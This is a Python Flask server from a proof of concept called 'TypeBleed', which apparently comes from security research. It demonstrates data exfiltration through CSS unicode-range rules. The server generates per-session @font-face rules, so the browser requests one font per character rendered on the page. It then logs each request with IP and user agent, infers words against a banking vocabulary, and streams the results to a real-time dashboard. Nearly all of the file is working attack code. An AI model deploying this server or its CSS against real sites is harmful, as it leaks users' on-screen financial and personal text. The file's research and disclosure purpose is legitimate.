#!/usr/bin/env python3
"""
TypeBleed Server
================
HTTP server that serves the TypeBleed demo, logs per-character font requests,
and provides a real-time dashboard showing exfiltrated character data.

Usage:
    python server.py [--port 8080] [--host 0.0.0.0]

Security Research PoC - Bountyy Oy
"""

import json
import os
import re
import sys
import time
import uuid
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path

from flask import (
    Flask,
    Response,
    jsonify,
    render_template_string,
    request,
    send_from_directory,
)

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
PROJECT_ROOT = Path(__file__).resolve().parent.parent
FONTS_DIR = PROJECT_ROOT / "fonts" / "char"
DEMO_DIR = PROJECT_ROOT / "demo"

# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------
app = Flask(__name__, static_folder=None)

# ---------------------------------------------------------------------------
# In-memory session store
# ---------------------------------------------------------------------------
# sessions[session_id] = {
#     "codepoints": {codepoint_hex: timestamp, ...},
#     "ip": str,
#     "user_agent": str,
#     "first_seen": float,
#     "last_seen": float,
# }
sessions = defaultdict(lambda: {
    "codepoints": {},
    "ip": "",
    "user_agent": "",
    "first_seen": 0,
    "last_seen": 0,
})

# Raw log entries: [(timestamp, ip, session_id, codepoint_hex), ...]
access_log = []

# Character map for display
CHAR_MAP = {}
for cp in range(0x0020, 0x007F):
    CHAR_MAP[f"{cp:04X}"] = chr(cp)
for ch in "€£¥₿":
    CHAR_MAP[f"{ord(ch):04X}"] = ch


def codepoint_to_char(hex_cp):
    """Convert hex codepoint string to displayable character."""
    return CHAR_MAP.get(hex_cp.upper(), f"U+{hex_cp}")


# ---------------------------------------------------------------------------
# CSS generation (per-session unique font URLs)
# ---------------------------------------------------------------------------
def generate_session_css(session_id):
    """Generate @font-face CSS with per-session font URLs."""
    # Import character list from generator
    sys.path.insert(0, str(PROJECT_ROOT / "fonts"))
    try:
        from generate import CHARACTERS
    except ImportError:
        # Fallback character set
        CHARACTERS = {}
        for cp in range(0x0061, 0x007B):
            CHARACTERS[cp] = chr(cp)
        for cp in range(0x0041, 0x005B):
            CHARACTERS[cp] = chr(cp)
        for cp in range(0x0030, 0x003A):
            CHARACTERS[cp] = chr(cp)
        CHARACTERS[0x0020] = "space"
        for ch in ".!?,'\"-():;/@#$%&*+=€£¥₿<>{}[]|\\~^_":
            CHARACTERS[ord(ch)] = ch

    rules = []
    rules.append("/* TypeBleed — per-session exfiltration CSS */")
    rules.append(f"/* Session: {session_id} */\n")

    for codepoint in sorted(CHARACTERS.keys()):
        hex_cp = f"{codepoint:04X}"
        char_name = CHARACTERS[codepoint]
        comment = char_name if len(char_name) == 1 else f"({char_name})"

        rules.append(f"@font-face {{")
        rules.append(f"  font-family: 'TypeBleed';")
        rules.append(
            f"  src: url('/fonts/t/{session_id}/{hex_cp}.woff2') "
            f"format('woff2');"
        )
        rules.append(f"  unicode-range: U+{hex_cp}; /* {comment} */")
        rules.append(f"}}\n")

    return "\n".join(rules)


# ---------------------------------------------------------------------------
# Routes — Demo
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    """Serve the banking demo page with a unique session ID."""
    session_id = uuid.uuid4().hex[:16]

    html_path = DEMO_DIR / "index.html"
    if not html_path.exists():
        return "Demo page not found. Run fonts/generate.py first.", 404

    html = html_path.read_text()
    # Template substitution
    html = html.replace("{{ session_id }}", session_id)
    html = html.replace("{{ session_id_short }}", session_id[:8])

    return html


@app.route("/css/exfil/<session_id>")
def exfil_css(session_id):
    """Serve dynamically generated per-session exfiltration CSS."""
    css = generate_session_css(session_id)
    return Response(css, mimetype="text/css", headers={
        "Cache-Control": "no-store",
        "X-TypeBleed-Session": session_id,
    })


@app.route("/static/<path:filename>")
def static_files(filename):
    """Serve static demo files."""
    return send_from_directory(str(DEMO_DIR), filename)


# ---------------------------------------------------------------------------
# Routes — Font serving with logging (the exfiltration point)
# ---------------------------------------------------------------------------
@app.route("/fonts/t/<session_id>/<codepoint>.woff2")
def serve_tracked_font(session_id, codepoint):
    """
    Serve a per-character font file and log the request.
    This is the core of the exfiltration — each request reveals
    one character that was rendered on the client's screen.
    """
    codepoint = codepoint.upper()
    now = time.time()

    # Log the request
    entry = {
        "timestamp": now,
        "datetime": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "session_id": session_id,
        "codepoint": codepoint,
        "character": codepoint_to_char(codepoint),
        "user_agent": request.headers.get("User-Agent", ""),
    }
    access_log.append(entry)

    # Update session data
    sess = sessions[session_id]
    sess["codepoints"][codepoint] = now
    sess["ip"] = request.remote_addr
    sess["user_agent"] = request.headers.get("User-Agent", "")
    if sess["first_seen"] == 0:
        sess["first_seen"] = now
    sess["last_seen"] = now

    # Print to server console
    char_display = codepoint_to_char(codepoint)
    print(
        f"[EXFIL] session={session_id[:8]}... "
        f"char=U+{codepoint} '{char_display}' "
        f"ip={request.remote_addr}"
    )

    # Serve the actual font file
    font_file = FONTS_DIR / f"{codepoint}.woff2"
    if font_file.exists():
        return send_from_directory(
            str(FONTS_DIR), f"{codepoint}.woff2",
            mimetype="font/woff2",
            max_age=0,
        )
    else:
        # Return a minimal valid response so the browser doesn't retry
        return Response(b"", status=204)


@app.route("/fonts/char/<path:filename>")
def serve_static_font(filename):
    """Serve font files without tracking (for static CSS usage)."""
    return send_from_directory(str(FONTS_DIR), filename, mimetype="font/woff2")


# ---------------------------------------------------------------------------
# Routes — Dashboard
# ---------------------------------------------------------------------------
DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TypeBleed — Exfiltration Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; }
        .glow { text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41; }
        .card { background: #111; border: 1px solid #222; }
        .char-badge {
            display: inline-flex; align-items: center; justify-content: center;
            width: 2.2rem; height: 2.2rem; margin: 2px;
            background: #1a1a2e; border: 1px solid #00ff41;
            border-radius: 4px; font-size: 1rem; font-weight: bold;
            color: #00ff41; transition: all 0.3s ease;
        }
        .char-badge.new {
            animation: flash 0.5s ease;
            background: #003300;
        }
        @keyframes flash {
            0% { background: #00ff41; color: #000; transform: scale(1.3); }
            100% { background: #003300; color: #00ff41; transform: scale(1); }
        }
        .log-entry { border-bottom: 1px solid #1a1a1a; padding: 4px 0; font-size: 0.8rem; }
        .log-entry:hover { background: #1a1a1a; }
        #log-container { max-height: 400px; overflow-y: auto; }
        .pulse { animation: pulse-glow 2s ease-in-out infinite; }
        @keyframes pulse-glow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
    </style>
</head>
<body class="min-h-screen p-6">

    <!-- Header -->
    <div class="max-w-7xl mx-auto mb-8">
        <div class="flex items-center justify-between">
            <div>
                <h1 class="text-3xl font-bold glow">TypeBleed</h1>
                <p class="text-gray-500 text-sm mt-1">CSS unicode-range exfiltration dashboard</p>
            </div>
            <div class="flex items-center space-x-4">
                <div class="flex items-center space-x-2">
                    <div class="w-2 h-2 bg-green-500 rounded-full pulse"></div>
                    <span class="text-gray-400 text-sm">MONITORING</span>
                </div>
                <span class="text-gray-600 text-sm" id="clock"></span>
            </div>
        </div>
    </div>

    <!-- Stats Bar -->
    <div class="max-w-7xl mx-auto grid grid-cols-4 gap-4 mb-8">
        <div class="card rounded-lg p-4">
            <p class="text-gray-500 text-xs uppercase tracking-wider">Active Sessions</p>
            <p class="text-2xl font-bold mt-1" id="stat-sessions">0</p>
        </div>
        <div class="card rounded-lg p-4">
            <p class="text-gray-500 text-xs uppercase tracking-wider">Characters Captured</p>
            <p class="text-2xl font-bold mt-1" id="stat-chars">0</p>
        </div>
        <div class="card rounded-lg p-4">
            <p class="text-gray-500 text-xs uppercase tracking-wider">Font Requests</p>
            <p class="text-2xl font-bold mt-1" id="stat-requests">0</p>
        </div>
        <div class="card rounded-lg p-4">
            <p class="text-gray-500 text-xs uppercase tracking-wider">Unique IPs</p>
            <p class="text-2xl font-bold mt-1" id="stat-ips">0</p>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-6">

        <!-- Sessions Panel -->
        <div class="card rounded-lg">
            <div class="p-4 border-b border-gray-800">
                <h2 class="text-sm font-semibold uppercase tracking-wider text-gray-400">
                    Captured Sessions
                </h2>
            </div>
            <div id="sessions-container" class="p-4 space-y-6 max-h-[600px] overflow-y-auto">
                <p class="text-gray-600 text-sm">Waiting for connections...</p>
            </div>
        </div>

        <!-- Live Log -->
        <div class="card rounded-lg">
            <div class="p-4 border-b border-gray-800">
                <h2 class="text-sm font-semibold uppercase tracking-wider text-gray-400">
                    Live Access Log
                </h2>
            </div>
            <div id="log-container" class="p-4 font-mono text-xs">
                <p class="text-gray-600">Waiting for font requests...</p>
            </div>
        </div>

    </div>

    <!-- Reconstruction Panel -->
    <div class="max-w-7xl mx-auto mt-6">
        <div class="card rounded-lg">
            <div class="p-4 border-b border-gray-800">
                <h2 class="text-sm font-semibold uppercase tracking-wider text-gray-400">
                    Text Reconstruction Analysis
                </h2>
            </div>
            <div id="reconstruction-container" class="p-4">
                <p class="text-gray-600 text-sm">No data to analyze yet.</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="max-w-7xl mx-auto mt-8 text-center text-xs text-gray-600">
        <p>TypeBleed — Security Research PoC by Bountyy Oy (bountyy.fi)</p>
        <p class="mt-1">No real data is exfiltrated. All content is hardcoded for demonstration.</p>
    </div>

    <script>
    // Poll interval in ms
    const POLL_INTERVAL = 1500;
    let lastLogCount = 0;
    let knownChars = {};  // session_id -> Set of codepoints

    function updateClock() {
        document.getElementById('clock').textContent =
            new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
    }
    setInterval(updateClock, 1000);
    updateClock();

    async function poll() {
        try {
            const resp = await fetch('/api/sessions');
            const data = await resp.json();

            // Update stats
            document.getElementById('stat-sessions').textContent = data.session_count;
            document.getElementById('stat-chars').textContent = data.total_chars;
            document.getElementById('stat-requests').textContent = data.total_requests;
            document.getElementById('stat-ips').textContent = data.unique_ips;

            // Update sessions
            const container = document.getElementById('sessions-container');
            if (data.sessions.length === 0) {
                container.innerHTML = '<p class="text-gray-600 text-sm">Waiting for connections...</p>';
            } else {
                container.innerHTML = data.sessions.map(sess => {
                    const prevChars = knownChars[sess.session_id] || new Set();
                    const newCharsSet = new Set(sess.codepoints);
                    knownChars[sess.session_id] = newCharsSet;

                    const charBadges = sess.characters.map((ch, i) => {
                        const cp = sess.codepoints[i];
                        const isNew = !prevChars.has(cp);
                        const displayChar = ch === ' ' ? '␣' : ch;
                        return `<span class="char-badge ${isNew ? 'new' : ''}" title="U+${cp}">${displayChar}</span>`;
                    }).join('');

                    const inferred = sess.inferred_words.length > 0
                        ? `<div class="mt-2 text-yellow-500 text-xs">
                             <span class="text-gray-500">Possible words:</span>
                             ${sess.inferred_words.join(', ')}
                           </div>`
                        : '';

                    return `
                        <div class="mb-4">
                            <div class="flex items-center justify-between mb-2">
                                <span class="text-xs text-gray-500">
                                    Session <span class="text-green-400">${sess.session_id.slice(0, 8)}...</span>
                                    from ${sess.ip}
                                </span>
                                <span class="text-xs text-gray-600">
                                    ${sess.char_count} chars captured
                                </span>
                            </div>
                            <div class="flex flex-wrap">${charBadges}</div>
                            ${inferred}
                            <div class="mt-2 text-xs text-gray-600">
                                Sorted: <span class="text-gray-400">${sess.sorted_chars}</span>
                            </div>
                        </div>
                    `;
                }).join('<hr class="border-gray-800 my-4">');
            }

            // Update log
            const logResp = await fetch('/api/log?since=' + lastLogCount);
            const logData = await logResp.json();
            if (logData.entries.length > 0) {
                const logContainer = document.getElementById('log-container');
                if (lastLogCount === 0) {
                    logContainer.innerHTML = '';
                }
                logData.entries.forEach(entry => {
                    const div = document.createElement('div');
                    div.className = 'log-entry new';
                    const charDisplay = entry.character === ' ' ? '␣' : entry.character;
                    div.innerHTML = `
                        <span class="text-gray-600">${entry.datetime.slice(11, 19)}</span>
                        <span class="text-gray-500">${entry.ip.padEnd(15)}</span>
                        <span class="text-blue-400">${entry.session_id.slice(0, 8)}</span>
                        <span class="text-green-400 font-bold"> U+${entry.codepoint} </span>
                        <span class="text-yellow-400">'${charDisplay}'</span>
                    `;
                    logContainer.appendChild(div);
                });
                logContainer.scrollTop = logContainer.scrollHeight;
                lastLogCount = logData.total;
            }

            // Update reconstruction
            if (data.sessions.length > 0) {
                const reconContainer = document.getElementById('reconstruction-container');
                reconContainer.innerHTML = data.sessions.map(sess => {
                    return `
                        <div class="mb-3">
                            <span class="text-gray-500 text-xs">Session ${sess.session_id.slice(0, 8)}:</span>
                            <div class="text-sm mt-1">
                                <span class="text-gray-500">Character set:</span>
                                <span class="text-green-400">{${sess.sorted_chars}}</span>
                            </div>
                            <div class="text-sm">
                                <span class="text-gray-500">Count:</span>
                                <span class="text-green-400">${sess.char_count} unique characters</span>
                            </div>
                            ${sess.inferred_words.length > 0 ? `
                            <div class="text-sm">
                                <span class="text-gray-500">Inferred words:</span>
                                <span class="text-yellow-400">${sess.inferred_words.join(', ')}</span>
                            </div>` : ''}
                        </div>
                    `;
                }).join('');
            }

        } catch (e) {
            console.error('Poll error:', e);
        }
    }

    setInterval(poll, POLL_INTERVAL);
    poll();
    </script>

</body>
</html>
"""


@app.route("/dashboard")
def dashboard():
    """Serve the real-time exfiltration dashboard."""
    return render_template_string(DASHBOARD_HTML)


# ---------------------------------------------------------------------------
# Routes — API for dashboard
# ---------------------------------------------------------------------------
COMMON_WORDS = [
    "the", "be", "to", "of", "and", "a", "in", "that", "have", "i",
    "it", "for", "not", "on", "with", "he", "as", "you", "do", "at",
    "this", "but", "his", "by", "from", "they", "we", "say", "her",
    "she", "or", "an", "will", "my", "one", "all", "would", "there",
    "their", "what", "so", "up", "out", "if", "about", "who", "get",
    "which", "go", "me", "when", "make", "can", "like", "time", "no",
    "just", "him", "know", "take", "people", "into", "year", "your",
    "good", "some", "could", "them", "see", "other", "than", "then",
    "now", "look", "only", "come", "its", "over", "think", "also",
    "back", "after", "use", "two", "how", "our", "work", "first",
    "well", "way", "even", "new", "want", "because", "any", "these",
    "give", "day", "most", "us", "bank", "account", "balance",
    "transfer", "payment", "salary", "credit", "debit", "card",
    "savings", "current", "iban", "transaction", "amount", "total",
    "euro", "monthly", "pass", "food", "delivery", "secure",
    "security", "personal", "welcome", "active", "enabled",
    "helsinki", "finland",
]


def infer_words(char_set):
    """Given a set of characters, find common words that could be spelled."""
    char_set_lower = {c.lower() for c in char_set}
    possible = []
    for word in COMMON_WORDS:
        if all(c in char_set_lower for c in word):
            possible.append(word)
    # Return top 15 by length (longer = more interesting)
    possible.sort(key=len, reverse=True)
    return possible[:15]


@app.route("/api/sessions")
def api_sessions():
    """API endpoint returning current session data."""
    result = []
    unique_ips = set()
    total_chars = 0

    for sid, data in sessions.items():
        if not data["codepoints"]:
            continue

        unique_ips.add(data["ip"])
        chars = []
        codepoints = []
        for cp_hex in sorted(data["codepoints"].keys()):
            ch = codepoint_to_char(cp_hex)
            chars.append(ch)
            codepoints.append(cp_hex)

        total_chars += len(chars)
        sorted_chars = "".join(
            c if c != " " else "␣" for c in sorted(chars)
        )

        char_set = set(chars)
        inferred = infer_words(char_set)

        result.append({
            "session_id": sid,
            "ip": data["ip"],
            "user_agent": data["user_agent"][:80],
            "first_seen": data["first_seen"],
            "last_seen": data["last_seen"],
            "char_count": len(chars),
            "characters": chars,
            "codepoints": codepoints,
            "sorted_chars": sorted_chars,
            "inferred_words": inferred,
        })

    # Sort by most recent
    result.sort(key=lambda x: x["last_seen"], reverse=True)

    return jsonify({
        "sessions": result,
        "session_count": len(result),
        "total_chars": total_chars,
        "total_requests": len(access_log),
        "unique_ips": len(unique_ips),
    })


@app.route("/api/log")
def api_log():
    """API endpoint returning access log entries."""
    since = int(request.args.get("since", 0))
    entries = access_log[since:]

    return jsonify({
        "entries": entries[-100:],  # Last 100 entries
        "total": len(access_log),
    })


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    import argparse

    parser = argparse.ArgumentParser(description="TypeBleed Server")
    parser.add_argument("--port", "-p", type=int, default=8080,
                        help="Port to listen on (default: 8080)")
    parser.add_argument("--host", "-H", type=str, default="0.0.0.0",
                        help="Host to bind to (default: 0.0.0.0)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable Flask debug mode")
    args = parser.parse_args()

    # Check if font files exist
    if not FONTS_DIR.exists() or not any(FONTS_DIR.glob("*.woff2")):
        print("[!] No font files found in fonts/char/")
        print("[!] Run 'python fonts/generate.py' first to generate "
              "per-character font files.")
        print("[!] Starting server anyway — font requests will return 204.\n")

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ████████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗     ███████╗███████╗██████╗  ║
║   ╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║     ██╔════╝██╔════╝██╔══██╗ ║
║      ██║    ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║     █████╗  █████╗  ██║  ██║ ║
║      ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══╝  ██║  ██║ ║
║      ██║      ██║   ██║     ███████╗██████╔╝███████╗███████╗███████╗██████╔╝ ║
║      ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚═════╝ ╚══════╝╚══════╝╚══════╝╚═════╝  ║
║                                                              ║
║   CSS unicode-range exfiltration PoC                         ║
║   Security Research by Bountyy Oy — bountyy.fi              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

[*] Demo page:  http://{args.host}:{args.port}/
[*] Dashboard:  http://{args.host}:{args.port}/dashboard
[*] API:        http://{args.host}:{args.port}/api/sessions

[*] Font dir:   {FONTS_DIR}
[*] Listening on {args.host}:{args.port}...
""")

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
